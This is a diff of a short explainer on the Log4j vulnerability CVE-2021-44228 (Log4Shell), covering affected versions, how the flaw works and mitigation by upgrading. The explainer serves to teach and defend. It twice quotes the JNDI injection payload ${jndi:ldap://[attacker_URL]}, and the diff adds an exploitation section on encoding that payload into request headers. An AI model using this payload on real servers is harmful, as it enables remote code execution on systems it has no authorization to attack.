@@ -1,26 +1,47 @@
                                                                    Log4j zero-day vulnerability
-                                                                 *********************************
+   Blog
+   ******
    https://www.prplbx.com/resources/blog/log4j/
 
-   
+   Detail
+   ********
    The security risk with Log4j has been termed as CVE-2021-44228 or Log4Shell or LogJam or Log4Shell or Log4j RCE(Remote Code Execution).
    This vulnerability was discovered by Chen Zhaojun of the Alibaba Cloud Security Team on December 9th, 2021. 
    As per the Common Vulnerability Scoring System or CVSS, Apache team ranked the vulnerability as 10.
+   This issue affects Apache Log4j 2 versions 2.0 to 2.14.1.
+   Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.
    
-   This vulnerability allows unauthenticated RCE(Remote Code Execution) with JNDI & LDAP in Log4j. 
-   Attackers can take advantage of it by modifying their browser's user-agent string to ${jndi:ldap://[attacker_URL]} format.
+   This vulnerability allows unauthenticated RCE(Remote Code Execution) in Apache Log4j with message lookup enabled (with JNDI) & LDAP. 
+   
+   Attackers can take advantage of it by modifying their browser's user-agent string(request payload) to ${jndi:ldap://[attacker_URL]} format.
    An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. 
    JNDI allows programmers to look up items using a variety of services and protocols, including LDAP, DNS, Java Remote Method Invocation (RMI), and others.
    
+   Exploitation
+   *************
+   With below site for "URL Decoder/Encoder" of JNDI payload , attacker can pass fishy URl as encoded string in request payload as header of REST POST/GET method.
+   https://meyerweb.com/eric/tools/dencoder/
+   
+   Example - 
+   If ${jndi:ldap://[attacker_URL]} is encoded with above and passed as request header parameter in GET/POST.
+   then log4j will log the activity and JNDI will connect with given attacker_URL.
+   Now attacker can easily perform any action as required on webserver from his fishy attacker_URL.
+   
+   Mitigation(Reduce/solve)
+   ***************************
    From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 , this functionality has been completely removed. 
+ . This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.
+   Thus better to use 2.17.1.
   
   
+  Important concepts/videos
+  ***************************
   
   CVE - Common Vulnerabilities and Exposures. CVE provides a free dictionary for organizations to improve their cyber security.
   JNDI - Java Naming and Directory Interface.
   LDAP - Lightweight Directory Access Protocol.
   
-  Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.
+
   
   What is this & way to mitigate(reducing to make less harm)
    https://www.youtube.com/watch?v=gkVq4kLULOA&t=20s
